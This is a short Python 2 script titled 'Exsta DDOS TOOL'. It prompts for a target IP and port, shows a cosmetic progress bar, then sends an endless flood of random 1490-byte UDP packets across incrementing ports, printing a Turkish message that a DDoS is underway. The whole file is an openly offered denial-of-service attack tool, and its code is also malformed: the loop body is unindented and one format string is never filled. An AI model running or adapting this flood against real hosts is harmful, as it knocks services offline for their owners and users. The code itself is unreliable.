import os
import socket
import sys
import time
import random


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)
os.system("clear")
os.system("figlet Exsta DDOS TOOL ")
print "author Exsta"
ip = raw_input ("target ip: ")
port = input ("enter port: ")

os.system("clear")
os.system("figlet DDOS TOOL RUNNING ")

print "[+]--                   [+] 0%"
time.sleep(1)
print "[+]-xxxxx>              [+] 25%"
time.sleep(2)
print "[+]-xxxxxxxxx>          [+] 50%"
time.sleep(2)
print "[+]-xxxxxxxxxxxxxx>     [+] 75%"
time.sleep(2)
print "[+]-xxxxxxxxxxxxxxxxxx> [+] 100%"
time.sleep(1)

sent = 0

while True:
sock.sendto(bytes, (ip,port))
sent = sent + 1
port = port + 1

print "DDOS İŞLEMİ YAPILIYOR %s PAKET YOLLANILDI"